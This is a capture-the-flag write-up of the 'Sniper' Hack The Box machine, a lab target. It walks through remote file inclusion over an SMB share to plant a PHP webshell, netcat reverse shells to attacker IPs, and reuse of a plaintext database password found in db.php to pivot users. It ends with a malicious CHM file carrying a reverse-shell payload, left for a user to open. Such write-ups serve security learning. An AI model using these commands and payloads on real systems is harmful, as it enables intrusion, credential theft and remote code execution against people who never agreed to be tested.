Initial Shell:

Frist test the vuln url: http://10.10.10.151/blog/?lang=blog-en.php
using this : http://10.10.10.151/blog/?lang=.\blog-en.php  (.\ cause it's windows server)
And we can test it by sending /blog/?lang=\windows\win.ini

Vuln confirmed.





GOOD, show the responser correctly !

U can try some LFI, but now we go to the point : RFI

Follow the article, cause this box will block php upload via HTTP(S)
http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html

apt-get install samba
mkdir /var/www/html/pub/
chmod 0555 /var/www/html/pub/
chown -R nobody:nogroup /var/www/html/pub/
echo > /etc/samba/smb.conf

Put below mentioned content in file '/etc/samba/smb.conf'
[global]
workgroup = WORKGROUP
server string = Samba Server %v
netbios name = indishell-lab
security = user
map to guest = bad user
name resolve order = bcast host
dns proxy = no
bind interfaces only = yes

[ica]
path = /var/www/html/pub
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody


service smbd stop
service smbd start 

now download the webshell here : 
https://github.com/WhiteWinterWolf/wwwolf-php-webshell

Then upload via smbd service using this below:
http://10.10.10.151/blog/?lang=\\10.10.14.219\ica\webshell.php

then you'll get an ugly webshell :P


After that, upload nc.exe to get a nice reverse shell
1. Create a folder 
>  mkdir C:\tmp

2. upload browse 'nc.exe' and execute

3. Execute Cmd nc
> .\nc.exe -e cmd.exe 10.10.15.82 1122



Get an initial shell :D !

=======================================================================

User Shell:

We can found creds at C:\inetpub\wwwroot\user\db.php
C:\inetpub\wwwroot\user>type db.php
type db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>



And net user & view the Users dir found out that there's a Chris user.
smbmap working with Chris:36mEAhz/B8xQ~2VM

So let's try out switch user to chris.

this is my script to chris :
root@kali:~/Desktop/htb/sniper# cat suchris.ps1 
$pass = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('sniper\Chris', $pass)
Invoke-Command -ComputerName sniper -Credential $cred -ScriptBlock { C:\tmp\nc.exe -e cmd.exe 10.10.15.82 1133 }


REMEMBER ! You HAVE TO allow anybody to read write execute the nc.exe
execute icacls nc.exe /grant Everyone:F as authority\iusr ( either webshell or reverse shell )
> icacls nc.exe /grant Everyone:F

run the suchris.ps1 and set a listener , you should get a sniper\chris shell.
C:\tmp>powershell
powershell

.\PS C:\tmp> suchris.ps1
.\suchris.ps1

Root Shell:

There's note.txt locate at C:\Docs
C:\Docs>type note.txt
type note.txt
Hi Chris,
	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.

K, it means that if we upload file here the CEO might open it :D

Then we could find a file locate at : C:\Users\Chris\Downloads\instructions.chm
download it by nc, view it via windows.

it's a doc, and CEO told Chris to give a doc to him :P
So........ send a BAAD chm to CEO at C:\Docs might work.

Create a malicious chm via here:
https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1
Remember create a malicious chm on ur own windows VM, bacause windows defender will block the Out-CHM.ps1 upload.

Creattion:
PS D:\PT\Mywriteups\sniper> Out-CHM -Payload 'C:\tmp\nc.exe -e cmd 10.10.15.82 7788' -HHCPath " C:\Program Files (x86)\HTML Help Workshop"
Microsoft HTML Help Compiler 4.74.8702

Compiling d:\PT\Mywriteups\sniper\doc.chm


Compile time: 0 minutes, 0 seconds
2       Topics
4       Local links
4       Internet links
0       Graphics


Created d:\PT\Mywriteups\sniper\doc.chm, 13,728 bytes
Compression increased file by 570 bytes.

Ok now upload it via webshell, it's easier , remember to name it different from doc,
a lot people on server
also remember icacls doc7788.chm /grant Everyone:F.

Now put the file to C:\Docs
> move C:\tmp\doc7788.chm C:\Docs

Now wait for stupid CEO to click the malicious file :) !
